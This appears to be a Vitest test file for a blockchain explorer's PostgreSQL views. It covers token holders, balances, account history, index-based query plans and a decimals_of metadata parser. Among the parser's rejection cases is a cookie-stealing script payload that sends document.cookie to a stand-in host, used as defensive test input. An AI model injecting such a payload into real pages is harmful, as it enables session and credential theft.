import { deflateSync } from 'node:zlib';
import { describe, expect, onTestFinished, test } from 'vitest';
import * as KeetaNet from '@keetanetwork/keetanet-client';
import type { Account, GenericAccount } from '@keetanetwork/keetanet-client/lib/account.js';
import type { Block } from '@keetanetwork/keetanet-client/lib/block/index.js';
import type pg from 'pg';
import { PostgresLedgerStorage } from '../ledger/storage/postgres/driver.js';
import { certificateFor, certificateIssuedBy, ChainCursor, DEFAULT_WEIGHTS, GENESIS_MOMENT, requireAt } from '../ledger/storage/suite/support.js';
import { confirmedStaple, createTokenBlock, manageCertificateBlock, sendBlock, setInfoBlock, tokenSupplyBlock } from '../testing/blocks.js';
import { createTestNetwork, freezeClock, type TestNetwork } from '../testing/network.js';
import { DEFAULT_INDEXER_SETTINGS, freshness, indexBatch, startingState } from './indexer.js';
import { explorerDatabase } from './testing.js';

const lib = KeetaNet.lib;

type Fixture = {
	readonly writer: pg.Pool;
	readonly reader: pg.Pool;
	readonly admin: pg.Pool;
	readonly network: TestNetwork;
	readonly cursor: ChainCursor;
	readonly apply: (blocks: readonly Block[]) => Promise<void>;
};

const fixture = async function(): Promise<Fixture> {
	const { database, writer, reader, admin } = await explorerDatabase();
	const storage = new PostgresLedgerStorage({ kind: 'connection-string', connectionString: database.connectionString });
	onTestFinished(function() {
		return(storage.destroy());
	});
	freezeClock(GENESIS_MOMENT);
	const network = await createTestNetwork({ representativeWeights: DEFAULT_WEIGHTS });
	const ledger = network.createLedger(storage, requireAt(network.representatives, 0));
	await ledger.add(network.genesis);
	const cursor = new ChainCursor(network.genesis);
	const apply = async function(blocks: readonly Block[]): Promise<void> {
		await ledger.add(await confirmedStaple(blocks, network.representatives));
	};
	return({ writer, reader, admin, network, cursor, apply });
};

const indexAll = async function(writer: pg.Pool): Promise<void> {
	let state = await startingState(writer);
	for (;;) {
		const result = await indexBatch(writer, state, DEFAULT_INDEXER_SETTINGS, function() {
			return(GENESIS_MOMENT.getTime());
		});
		state = result.state;
		if (result.indexed === 0) {
			return;
		}
	}
};

const addressOf = function(account: GenericAccount): string {
	return(account.publicKeyString.get());
};

const base64Of = function(text: string): string {
	return(Buffer.from(text, 'utf-8').toString('base64'));
};

type Minting = { readonly decimals: number; readonly first: bigint; readonly second: bigint };

/** A token whose metadata gives it its decimals, minted and sent out whole to two holders. */
const mintedToken = async function(context: Fixture, minting: Minting = { decimals: 2, first: 100n, second: 50n }): Promise<{ token: GenericAccount; first: Account; second: Account }> {
	const { network, cursor } = context;
	const owner = requireAt(network.users, 0);
	const [first, second] = [requireAt(network.users, 1), requireAt(network.users, 2)];
	const created = await createTokenBlock({ owner, previous: cursor.previous(owner), network: network.network });
	const { token } = created;
	cursor.append(created.block);
	const named = cursor.append(await setInfoBlock({ account: token, signer: owner, previous: cursor.previous(token), network: network.network, name: 'CENT', description: 'a token of two decimals', metadata: base64Of(JSON.stringify({ decimalPlaces: minting.decimals })), defaultPermission: new lib.Permissions(['ACCESS']) }));
	const minted = cursor.append(await tokenSupplyBlock({ owner, token, amount: minting.first + minting.second, previous: cursor.previous(token), network: network.network }));
	const toSecond = cursor.append(await sendBlock({ from: token, signer: owner, to: second, amount: minting.second, token, previous: cursor.previous(token), network: network.network }));
	const toFirst = cursor.append(await sendBlock({ from: token, signer: owner, to: first, amount: minting.first, token, previous: cursor.previous(token), network: network.network }));
	await context.apply([created.block, named, minted, toSecond, toFirst]);
	return({ token, first, second });
};

/**
 * The plan of a query with sequential scans, bitmap scans and sorts priced
 * out. The test tables are so small that either would win on cost; priced
 * out, the plan shows whether a path that reads an index in its order exists
 * at all.
 */
const planOf = async function(pool: pg.Pool, query: string, values: readonly unknown[]): Promise<string> {
	const client = await pool.connect();
	try {
		await client.query('BEGIN');
		await client.query('SET LOCAL enable_seqscan = off');
		await client.query('SET LOCAL enable_bitmapscan = off');
		await client.query('SET LOCAL enable_sort = off');
		const plan = await client.query<{ 'QUERY PLAN': string }>(`EXPLAIN (COSTS OFF) ${query}`, [...values]);
		await client.query('ROLLBACK');
		return(plan.rows.map(function(row) {
			return(row['QUERY PLAN']);
		}).join('\n'));
	} finally {
		client.release();
	}
};

const EXPLORER_INDEXED_TABLES = /Seq Scan on (decoded_operations|decoded_blocks|holdings)\b/;

const SEQUENTIAL_SCAN = /Seq Scan/;

/** A Sort node; a Merge Append's own "Sort Key" line is not one. */
const SORT_NODE = /^\s*(->\s+)?(Incremental )?Sort$/m;

describe('the explorer views', function() {
	test('the reader reads every view', async function() {
		const context = await fixture();
		await mintedToken(context);
		const [owner, issuer] = [requireAt(context.network.users, 0), requireAt(context.network.users, 1)];
		const certificate = await certificateIssuedBy(issuer, owner, 3, false);
		const intermediates = new lib.Utils.Certificate.CertificateBundle([await certificateFor(issuer, 4)]);
		await context.apply([context.cursor.append(await manageCertificateBlock({ account: owner, method: lib.Block.AdjustMethod.ADD, certificateOrHash: certificate, intermediateCertificates: intermediates, previous: context.cursor.previous(owner), network: context.network.network }))]);
		await indexAll(context.writer);

		const views = await context.admin.query<{ table_name: string }>(`SELECT table_name FROM information_schema.views WHERE table_schema = 'explorer' ORDER BY table_name`);
		const names = views.rows.map(function(row) {
			return(row.table_name);
		});
		expect(names).toEqual([
			'account_history', 'accounts', 'acl', 'balances', 'blocks', 'certificates', 'delegations', 'holders',
			'operations', 'rep_weights', 'staples', 'status', 'token_summary', 'tokens', 'votes'
		]);
		for (const name of names) {
			const rows = await context.reader.query(`SELECT * FROM explorer.${name} LIMIT 1`);
			expect(rows.rows, name).toHaveLength(1);
		}
	});

	test('the holders of a minted token are listed highest first, in token units', async function() {
		const context = await fixture();
		const { token, first, second } = await mintedToken(context);
		await indexAll(context.writer);

		const holders = await context.reader.query('SELECT account, amount, decimals, amount_units FROM holders WHERE token = $1 ORDER BY amount DESC', [addressOf(token)]);

		expect(holders.rows).toEqual([
			{ account: addressOf(first), amount: '100', decimals: 2, amount_units: '1' },
			{ account: addressOf(second), amount: '50', decimals: 2, amount_units: '0.5' }
		]);
		const summary = await context.reader.query('SELECT name, decimals, supply, holders_count FROM token_summary WHERE token = $1', [addressOf(token)]);
		expect(summary.rows).toEqual([{ name: 'CENT', decimals: 2, supply: '150', holders_count: '2' }]);
		const account = await context.reader.query('SELECT kind, name FROM accounts WHERE account = $1', [addressOf(token)]);
		expect(account.rows).toEqual([{ kind: 'TOKEN', name: 'CENT' }]);
	});

	test('an amount in token units keeps every digit', async function() {
		const context = await fixture();
		const { token, first } = await mintedToken(context, { decimals: 18, first: 123456789012345678901234567890n, second: 1n });
		await indexAll(context.writer);

		const balances = await context.reader.query('SELECT token, amount, amount_units FROM balances WHERE account = $1 AND token = $2', [addressOf(first), addressOf(token)]);

		expect(balances.rows).toEqual([{ token: addressOf(token), amount: '123456789012345678901234567890', amount_units: '123456789012.34567890123456789' }]);
	});

	test('a send is in the sender\'s history going out and in the recipient\'s coming in', async function() {
		const context = await fixture();
		const { network, cursor } = context;
		const sender = requireAt(network.users, 0);
		const recipient = requireAt(network.users, 1);
		const sent = cursor.append(await sendBlock({ from: sender, to: recipient, amount: 7n, token: network.baseToken, previous: cursor.previous(sender), network: network.network }));
		await context.apply([sent]);
		await indexAll(context.writer);

		const history = await context.reader.query('SELECT account, direction, idx, type, counterparty, token, amount FROM account_history WHERE block_hash = $1 ORDER BY direction', [sent.hash.toString()]);

		expect(history.rows).toEqual([
			{ account: addressOf(recipient), direction: 'in', idx: 0, type: 'SEND', counterparty: addressOf(sender), token: addressOf(network.baseToken), amount: '7' },
			{ account: addressOf(sender), direction: 'out', idx: 0, type: 'SEND', counterparty: addressOf(recipient), token: addressOf(network.baseToken), amount: '7' }
		]);
		const operations = await context.reader.query('SELECT block_hash, idx, type, account, counterparty FROM operations WHERE block_hash = $1', [sent.hash.toString()]);
		expect(operations.rows).toEqual([{ block_hash: sent.hash.toString(), idx: 0, type: 'SEND', account: addressOf(sender), counterparty: addressOf(recipient) }]);
		const block = await context.reader.query('SELECT account, signer, operation_count FROM blocks WHERE hash = $1', [sent.hash.toString()]);
		expect(block.rows).toEqual([{ account: addressOf(sender), signer: addressOf(sender), operation_count: 1 }]);
	});

	test('the reader reads the indexer\'s freshness from status', async function() {
		const context = await fixture();
		await indexAll(context.writer);
		await context.admin.query('UPDATE explorer.progress SET paused_reason = $1', ['node schema 99 is newer than this build']);

		const status = await context.reader.query('SELECT * FROM status');
		const expected = await freshness(context.writer);

		expect(status.rows).toEqual([{
			newest_indexed_sequence: expected.newestIndexed?.sequence.toString(),
			newest_indexed_staple_time: expected.newestIndexed?.stapleTime,
			newest_node_sequence: expected.newestNode?.sequence.toString(),
			newest_node_staple_time: expected.newestNode?.stapleTime,
			behind: expected.behind.toString(),
			paused_reason: 'node schema 99 is newer than this build'
		}]);
	});

	test('a filter on an address or a block hash reaches the explorer tables by an index', async function() {
		const context = await fixture();
		const { token, first } = await mintedToken(context);
		await indexAll(context.writer);
		const [someToken, someAccount] = [addressOf(token), addressOf(first)];
		const someHash = requireAt(context.network.genesis.blocks, 0).hash.toString();

		const plans = {
			holders: await planOf(context.reader, 'SELECT * FROM holders WHERE token = $1 ORDER BY amount DESC LIMIT 50', [someToken]),
			balances: await planOf(context.reader, 'SELECT * FROM balances WHERE account = $1', [someAccount]),
			history: await planOf(context.reader, 'SELECT * FROM account_history WHERE account = $1 ORDER BY staple_time DESC LIMIT 50', [someAccount]),
			operations: await planOf(context.reader, 'SELECT * FROM operations WHERE account = $1 ORDER BY staple_time DESC LIMIT 50', [someAccount]),
			byBlock: await planOf(context.reader, 'SELECT * FROM operations WHERE block_hash = $1', [someHash]),
			block: await planOf(context.reader, 'SELECT * FROM blocks WHERE hash = $1', [someHash])
		};

		for (const [name, plan] of Object.entries(plans)) {
			expect(plan, name).not.toMatch(EXPLORER_INDEXED_TABLES);
			expect(plan, name).toMatch(/Index (Only )?Scan (using|on) (accounts_public_key_key|decoded_blocks_hash_text)/);
		}
		const withoutHash = await planOf(context.reader, 'SELECT type, amount FROM operations WHERE account = $1', [someAccount]);
		expect(withoutHash).not.toMatch(/decoded_blocks/);
	});

	test('a filter on an id or a raw hash reads the explorer\'s indexes in their order', async function() {
		const context = await fixture();
		const { token, first } = await mintedToken(context);
		await indexAll(context.writer);
		const [someToken, someAccount] = [addressOf(token), addressOf(first)];
		const someHash = requireAt(context.network.genesis.blocks, 0).hash.toString();
		const someStaple = (await context.reader.query<{ blocks_hash: string }>('SELECT blocks_hash FROM staples LIMIT 1')).rows[0]?.blocks_hash;

		const ordered = {
			holders: await planOf(context.reader, 'SELECT * FROM holders WHERE token_id = explorer.id_of($1) ORDER BY amount DESC LIMIT 5', [someToken]),
			operations: await planOf(context.reader, 'SELECT * FROM operations WHERE account_id = explorer.id_of($1) ORDER BY staple_time DESC LIMIT 5', [someAccount]),
			history: await planOf(context.reader, 'SELECT * FROM account_history WHERE account_id = explorer.id_of($1) ORDER BY staple_time DESC LIMIT 5', [someAccount])
		};
		const keyed = {
			staples: await planOf(context.reader, 'SELECT * FROM staples WHERE blocks_hash_bytes = decode($1, \'hex\')', [someStaple]),
			votes: await planOf(context.reader, 'SELECT * FROM votes WHERE staple_bytes = decode($1, \'hex\')', [someStaple]),
			stapleBlocks: await planOf(context.reader, 'SELECT * FROM blocks WHERE staple_bytes = decode($1, \'hex\') ORDER BY position', [someStaple]),
			block: await planOf(context.reader, 'SELECT * FROM blocks WHERE hash_bytes = decode($1, \'hex\')', [someHash]),
			blockOperations: await planOf(context.reader, 'SELECT * FROM operations WHERE block_hash_bytes = decode($1, \'hex\') ORDER BY idx', [someHash])
		};

		for (const [name, plan] of Object.entries(ordered)) {
			expect(plan, name).toMatch(/^Limit/);
			expect(plan, name).not.toMatch(SORT_NODE);
		}
		expect(ordered.holders).toMatch(/Index Scan using holdings_token_balance on holdings/);
		expect(ordered.operations).toMatch(/Index Scan using decoded_operations_account_time on decoded_operations/);
		expect(ordered.history).toMatch(/Merge Append[\s\S]*Index Scan using decoded_operations_account_time[\s\S]*Index Scan using decoded_operations_counterparty_time/);
		expect(keyed.staples).toMatch(/Index Scan using staples_pkey on staples/);
		expect(keyed.votes).toMatch(/Index Scan using votes_main on votes/);
		expect(keyed.stapleBlocks).toMatch(/Index Scan using decoded_blocks_staple on decoded_blocks/);
		expect(keyed.block).toMatch(/Index Scan using decoded_blocks_pkey on decoded_blocks/);
		expect(keyed.blockOperations).toMatch(/Index Scan using decoded_operations_pkey on decoded_operations/);
		for (const [name, plan] of Object.entries(keyed)) {
			expect(plan, name).not.toMatch(SEQUENTIAL_SCAN);
			expect(plan, name).not.toMatch(SORT_NODE);
		}
	});

	test('an account\'s kind names its key type', async function() {
		const context = await fixture();
		const keyTypes = [0, 1, 2, 3, 4, 5, 6, 7];
		await context.admin.query('INSERT INTO public.accounts (public_key, key_type) SELECT \'kind_\' || key_type, key_type FROM unnest($1::smallint[]) AS key_type', [keyTypes]);

		const kinds = await context.reader.query('SELECT account, kind FROM accounts WHERE account LIKE \'kind\\_%\' ORDER BY account');

		expect(kinds.rows).toEqual([
			{ account: 'kind_0', kind: 'ECDSA_SECP256K1' },
			{ account: 'kind_1', kind: 'ED25519' },
			{ account: 'kind_2', kind: 'NETWORK' },
			{ account: 'kind_3', kind: 'TOKEN' },
			{ account: 'kind_4', kind: 'STORAGE' },
			{ account: 'kind_5', kind: '5' },
			{ account: 'kind_6', kind: 'ECDSA_SECP256R1' },
			{ account: 'kind_7', kind: 'MULTISIG' }
		]);
	});
});

describe('decimals_of', function() {
	const cases: readonly [string, string | null, number | null][] = [
		['eighteen decimal places', base64Of('{"decimalPlaces":18}'), 18],
		['no decimal places', base64Of('{"decimalPlaces":0,"name":"x"}'), 0],
		['the most decimal places', base64Of('{"decimalPlaces":255}'), 255],
		['no metadata', null, null],
		['empty metadata', '', null],
		['text that is not base64', 'not base64', null],
		['an array', base64Of('[]'), null],
		['an object without decimal places', base64Of('{}'), null],
		['decimal places as a string', base64Of('{"decimalPlaces":"18"}'), null],
		['a fraction', base64Of('{"decimalPlaces":1.5}'), null],
		['a negative count', base64Of('{"decimalPlaces":-1}'), null],
		['too many places', base64Of('{"decimalPlaces":256}'), null],
		['a number too large for a double', base64Of('{"decimalPlaces":1e400}'), null],
		['deflated JSON', deflateSync(Buffer.from('{"decimalPlaces":18}')).toString('base64'), null],
		['a script', base64Of('<script>document.location="https://example.com/?"+document.cookie</script>'), null]
	];

	test('reads an integer count of decimal places from base64 JSON, and nothing from anything else', async function() {
		const { reader } = await explorerDatabase();

		for (const [name, metadata, decimals] of cases) {
			const rows = await reader.query('SELECT explorer.decimals_of($1) AS decimals', [metadata]);
			expect(rows.rows, name).toEqual([{ decimals }]);
		}
	});
});
